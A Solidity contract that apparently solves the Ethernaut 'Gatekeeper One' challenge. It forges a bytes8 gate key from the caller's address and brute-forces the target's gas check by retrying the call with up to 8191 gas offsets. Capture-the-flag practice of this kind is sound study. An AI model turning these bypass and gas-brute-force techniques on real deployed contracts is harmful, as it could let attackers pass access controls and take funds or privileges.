// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperAttack {
    function buildGateKey() private view returns (bytes8) {
        bytes4 keyPart = bytes4(uint32(uint16(uint160(msg.sender))));
        bytes8 gateKey = bytes8(bytes.concat(keyPart, keyPart));

        return gateKey;
    }

    function attack(address _target) external {
        bytes memory data = abi.encodeWithSignature("enter(bytes8)", buildGateKey());
        uint16 i = 0;

        for (i; i < 8191; i += 1) {
            (bool success, ) = _target.call{gas: 50_000 + i}(data);

            if (success) {
                break;
            }
        }
    }

    function attack2(address _target) external {
        IGatekeeperOne(_target).enter(buildGateKey());
    }
}
